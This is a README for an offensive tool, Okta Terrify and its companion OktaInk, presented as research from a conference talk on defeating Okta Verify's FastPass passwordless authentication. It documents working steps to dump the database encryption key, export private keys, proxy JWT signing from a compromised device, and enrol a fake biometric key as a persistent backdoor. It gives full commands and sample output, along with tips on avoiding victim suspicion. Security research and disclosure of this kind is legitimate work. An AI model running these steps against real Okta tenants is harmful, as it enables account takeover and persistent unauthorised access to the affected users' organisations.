# Introduction

This tools was released as part of my BSides Cymru 2024 talk, Okta Terrify: Persistence in a Passwordless World.  The presentation deck and demonstration video have been included with this repository.

![Okta Terify Video Demo](OktaTerrify.mp4)

Okta Terrify is a tool to demonstrate how passwordless solutions such as Okta Verify's FastPass or other FIDO2/WebAuthn type solutions can be abused once an authenticator endpoint has been compromised.  Whilst Okta Terrify demonstrates Okta specific attacks, the same methodology would typically apply to other passwordless solutions, as generally they all leverage asymmetric cryptography.

# Passwordless Authentication

Passwordless authentication works via public/private key pairs.  Typically, there are two types of keys generated during authenticator enrollment, `Proof Of Possession` and `User Verification`.  Combined, both keys satisfy the multifactor element of authentication that organisations strive for as part of ongoing efforts to protect their users.

### Proof of Possession

The proof of possession key is designed to do just that, prove that presence of a specific authenticator and/or user during authentication.  In Okta's case, the the proof of possession key is used to determine the presence of both the authenticator and the user, since in multiuser scenarios, unique proof of possession keys are generated per user.  The proof of possession key is typically a silent key, which does not require any form of biometric data to unlock it's usage beyond that of the operating system itsself, such as an authenticated Windows user session.  When available, this key will be backed by a TPM and is therefore not possible to export from the device.  When a TPM is not available, this key is generated as a software only key.  

### User Verification

The user verification key also provides proof of possession, but additionally verifies that the user is indeed aware that authentication is taking place.  This is achieved through biometric data, often a fingerprint or facial recognition but is also backed up by a PIN.  On Windows based devices, this is typically implemented by using Windows Hello. Signing operations will not work without the correct biometric data provided.  Some passwordless solutions will use just the user verification key to satisfy both factors.  The drawback of this approach is that every signing operation will require the users biometric data.  In Okta's case for the example, the proof of possession key can be used as a distinct factor during authentication along with a septate factor such as the users password.  Again, this key is either backed by a TPM when available or generated in software if not.

## Okta

Ok, enough of this background on passwordless, lets get to the good stuff.  Whilst the same concepts exist across all supported Okta Verify devices, from here on we will be discussing how the Windows version of Okta Verify functions. 

Okta stores authenticator information inside an encrypted SQLite database.  There are two different database version, the legacy version stored inside a filed called `OVStore.db` which uses the users SID as the basis of the encryption key passed through a custom XOR algorithm and a fixed key.  The newer version is called `DataStore.db` and uses a random value that is stored in credential manager.  This credential is passed through a similar XOR algorithm as the legacy format.  The database is stored at `%LocalAppData%\Okta\OktaVerify\`. The database contains the generated key ids for both the proof of possession and user verification key which are generated during device enrollment.  The database also contains other useful metadata, like device, user and authenticator IDs along with the Okta tenant URL for the registered accounts. 

Okta Terrify is split into two distinct components.  Okta Terrify and OktaInk.

## Okta Terrify

Okta Terrify is designed to run on the attackers machine. The tool requires the users SID and a database file with legacy database format and for the newer format, the database key.  For the newer format, the database key can be generated using OktaInk.  Okta Terrify has 4 operating modes controlled through various switches.  

### Info

The `--info` mode simply dumps information contained within the database. 

#### Example
**Legacy Database**
```
OktaTerrify.exe --info -s S-1-5-21-*******-1001 --db C:\Users\Tester\AppData\Local\Okta\OktaVerify\OVStore.db
2023-11-21 11:49:56.2243|INFO|OktaTerrify|Okta Terrify is starting....
C:\Users\Tester\AppData\Local\Okta\OktaVerify\OVStore.db

Database Encryption Key: 3a9d6ad1643f2608479c976f1a2ebcb98c115c379d8dfaa2bb6ab2c65c286250
User Id: 00u8*******
Client Instance Id: cli*******
Device Id: guo9**********
Authenticator Url: https://tenant.okta.com/api/v1/authenticators/aut*****
Method Enrollment Id: crp*****
Device Enrollment Id: pfd*****
Sandbox Account Name: None
Keys:
  Id: SFT_********, Sandboxed: No, Type ProofOfPossession
  Id: BOL_********, Sandboxed: No, Type UserVerification
  Id: SFT_********, Sandboxed: No, Type DeviceAttestation
```

**Newer Database**
```
OktaTerrify.exe --info -s S-1-5-21-*******-1001 --db C:\Users\Tester\AppData\Local\Okta\OktaVerify\DataStore.db --dbkey a156a0b42c....6dd83f701
2023-11-21 11:49:56.2243|INFO|OktaTerrify|Okta Terrify is starting....
C:\Users\Tester\AppData\Local\Okta\OktaVerify\DataStore.db

Database Encryption Key: 3a9d6ad1643f2608479c976f1a2ebcb98c115c379d8dfaa2bb6ab2c65c286250
User Id: 00u8*******
Client Instance Id: cli*******
Device Id: guo9**********
Authenticator Url: https://tenant.okta.com/api/v1/authenticators/aut*****
Method Enrollment Id: crp*****
Device Enrollment Id: pfd*****
Sandbox Account Name: None
Keys:
  Id: SFT_********, Sandboxed: No, Type ProofOfPossession
  Id: BOL_********, Sandboxed: No, Type UserVerification
  Id: SFT_********, Sandboxed: No, Type DeviceAttestation
```

### Backdoor

In `--backdoor` mode, Okta Terrify will launch the tenant Okta URL using the OAuth client id that the official Okta Verify application uses during enrollment.  This will typically trigger the authentication flow and signing mode is active during this phase.  Once an authenticated session is created, a new user verification key is generated on the attacking device and is enrolled as a fake biometric key.  Once the key is enrolled, FastPass will operate in a passwordless state without any dependencies on the original compromised authenticator device.

#### Example

```
OktaTerrify.exe -b -s S-1-5-21-********-1001 -db C:\Users\Tester\AppData\Local\Okta\OktaVerify\OVStore.db -v
2023-11-21 11:47:10.4741|INFO|OktaTerrify|Okta Terrify is starting....
2023-11-21 11:47:10.5057|INFO|OktaTerrify.Oidc.LoopbackHttpListener|HTTP server listening on loopback ports 8769 65112
[=] Sign the device bind JWT on the enrolled Okta Verify device

  OktaInk -o SignDeviceBind -k BOL_************ -d pfd******** -u 00u******** -n bGI******** -t ftt******** -a https://tenant.okta.com -m crp**** -v

[.] Enter DeviceBind JWT:
eyJraW......
2023-11-21 11:47:43.9337|INFO|OktaTerrify|Signed JWT accepted, factor accepted
2023-11-21 11:47:48.5310|INFO|OktaTerrify|Authenticated as user victim@tenant.com, enrolling a fake userVerify TPM key
2023-11-21 11:47:48.5464|INFO|OktaTerrify|Generated new fake hardware biometric key and saved to file BD_******.key
[=] I now need the existing userVerification public key

  OktaInk -o ExportPublic -k BOL_************

[.] Enter userVerification public key:
nOng....
2023-11-21 11:48:05.1047|INFO|OktaTerrify|Passwordless persistence successful, now running in FastPass mode
2023-11-21 11:48:05.1047|INFO|OktaTerrify|Running in backdoor mode, press ESC to exit
```

### Sign

In `--sign` mode, during Okta authentication, challenges are either signed locally through exfiltrated keys or they can be proxied to OktaInk running on a compromised authenticator when hardware backed keys are present. 

#### Example
```
OktaTerrify.exe --sign -s S-1-5-21-******-1001 -db C:\Users\Tester\AppData\Local\Okta\OktaVerify\OVStore.db
2023-11-21 16:54:33.9386|INFO|OktaTerrify|Okta Terrify is starting....
2023-11-21 16:54:34.0014|INFO|OktaTerrify.Oidc.LoopbackHttpListener|HTTP server listening on loopback ports 8769 65112
2023-11-21 16:54:34.0014|INFO|OktaTerrify|Running in signing mode, press ESC to exit
2023-11-21 16:54:54.7414|WARN|OktaTerrify|!!WARNING!! - Incoming sign request for the user verification key, this will cause a popup on the victim machine to enter user verification PIN/Password because no local key exists. To force generation of user verification key signing, add the -v argument.  Falling back to proof of possession key
[=] Sign the device bind JWT on the enrolled Okta Verify device

  OktaInk -o SignDeviceBind -k SFT_********** -d pfd***** -u 00u****** -n C7bG****** -t ft4Kw******* -a https://tenant.okta.com -m crp*******

[.] Enter DeviceBind JWT:
eyJra.....
2023-11-24 16:55:10.8214|INFO|OktaTerrify|Signed JWT accepted, factor accepted
```

### Import

The `--import` mode will save software defined proof of possession and user verification keys that have been extracted using Okta Ink.

#### Example
```
OktaTerrify --import -k SFT_****** -p UlNBMgAIAAAD....M=
```

## Okta Ink

Okta Ink is designed to run on the compromised authenticator device.  The application supports 4 types of operations.  

### Generate DB Key

For the newer database format, the `--operation DumpDBKey` can be used to dump the database key for the `DataStore.db` file.  The key can then be used as a parameter for OkaInk.

OktaTerrify --import -k SFT_****** -p UlNBMgAIAAAD....M=

#### Example

```
OktaInk -o DumpDBKey 
[=] Credential manager key name: OKTA_VERIFY_STORE_ZfH+9F42Ch3X2+dZBFX3FCMtPnctn6lk8MqsCoH/Osc=
[+] DB Key: a156a....83f701

```

### JWT Sign

During the Okta authentication flow a challenge response JWT is generated to prove that either the proof of presence or user verification key is available.  The `--operation SignDeviceBind` mode can be used to sign the generated JWT with the proof of possession key, which is silent.  If you want to perform passwordless authentication, you can also sign with the user verification key by adding the `-v` argument.  WARNING - When requesting the user verification key, the victim user will be required to perform biometric validation and therefore could raise suspicion.

### Attestation Sign

Okta Verify also enrolls a device attestation key, which is a silent key.  This key appears to be used when changes are being made to the registered authenticator device via web API calls against the Okta tenant.  But it seems by default device attestation is not enforced, therefore signing is not required.  Regardless, this mode can be leveraged via the `--operation SignDeviceAttestation` arguments.

### Private Key Export

For devices that do not support a TPM, the `--operation ExportPrivate` command line can be use to export all keys registered on the device.  Proof of possession keys are tied to the users DPAPI key and therefore the users password must be known.   

### Public Key Export

During the backdoor enrolment process, we need to ensure that the existing public keys are retained within the tenant authenticator data.  `--operation ExportPublic` facilitates this by exporting the public key associated with a specific key id. 

#### Example
```
OktaInk -o ExportPublic -k BOL_******************
nOngWn_Bd8IH_8GJTjGeXpf....
```

